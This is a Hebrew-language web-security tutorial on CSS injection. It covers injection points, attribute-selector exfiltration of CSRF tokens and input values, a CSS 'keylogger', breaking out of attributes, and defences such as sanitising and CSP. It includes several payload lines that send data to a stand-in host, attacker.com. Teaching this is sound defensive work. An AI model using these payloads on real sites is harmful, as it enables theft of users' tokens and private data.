...
## הinjection CSS - יסודות

הinjection CSS מתרחשת כאשר תוקף יכול להחדיר תוכן CSS לדף. למרות ש-CSS אינו שפת תכנות, ניתן לנצל אותו לexfiltration מידע רגיש מהדף.

### נקודות injection נפוצות

```html
<!-- injection via style attribute -->
<div style="USER_INPUT_HERE"></div>

<!-- injection via style tag -->
<style>
  .widget { color: USER_INPUT_HERE; }
</style>

<!-- injection via CSS import -->
...
```
input: red; } body { background: url(https://attacker.com/css-injected) } .x {
result:
<style>
  .widget { color: red; }
...
## הexfiltration מידע עם Attribute Selectors
...
/* check if the input value starts with 'b' */
input[value^="b"] {
...
פתרון לבעיית הexfiltration הסדרתי - שימוש ב-CSS import שרץ שוב ושוב:
...
```css
/* server response - step2 (after discovering 'a') */
...
![איור מונפש של אקספילטרציה סדרתית ב-CSS שבו הסלקטור תואם קידומת ארוכה יותר בכל סבב והטוקן הסודי נחשף תו אחר תו](../../../images/illustrations/webadv-4-7-css-exfil-loop.svg)
...
/* apply to an element that contains the text */
.target-element {
...
```css
/* "keylogger" in CSS - only works with an input whose value updates in the attribute */
...
```css
/* React updates the value attribute */
...
## הexploit Scroll-to-Text Fragment
...
```css
/* if the browser scrolls to the text, the element gets a pseudo-class */
:target::before {
...
/* using a custom property to load only when it matches */
input[name="csrf"] {
  background: var(--x);
}
```
...
```css
/* turning a hidden input visible */
...
/* using list-style-image instead of background */
...
## הinjection CSS מתקדמת - ללא תגית style

כאשר יש injection point ב-attribute:

```html
<!-- injection in the class attribute -->
...
```
input: x" style="background:url(https://attacker.com/injected)" class="y
result: <div class="x" style="background:url(https://attacker.com/injected)" class="y"></div>
```

כאשר יש injection ב-style attribute:

```
input: ;background:url(https://attacker.com/injected)
result: <div style="color:red;background:url(https://attacker.com/injected)"></div>
```

---

## הexfiltration מידע מ-meta tags

```css
/* extracting meta tag content */
meta[name="csrf-token"][content^="a"] ~ * {
  background: url(https://attacker.com/leak?v=a);
}

/* meta tags are usually in head and not visible */
/* need to use a sibling selector */
head, head * {
  display: block;
}
...
### הימנעות מinjection CSS

```javascript
// don't put user input inside CSS
// bad:
...
function sanitizeCSSValue(value) {
  // removes url(), expression(), import, etc.
...
```javascript
// instead of a hidden input, keep the token in JavaScript only
// not accessible to CSS selectors
...
הinjection CSS היא טכניקת תקיפה שמאפשרת exfiltration מידע רגיש מדפי HTML ללא JavaScript. הטכניקה מנצלת attribute selectors ו-background URLs כדי לשלוח מידע לשרת התוקף. למרות מגבלות מעשיות, היא יעילה במיוחד לexfiltration CSRF tokens ומידע מ-hidden inputs. ההגנה דורשת CSP מחמיר, הימנעות מהחדרת קלט משתמש לתוך CSS, והפרדת מידע רגיש מ-DOM.
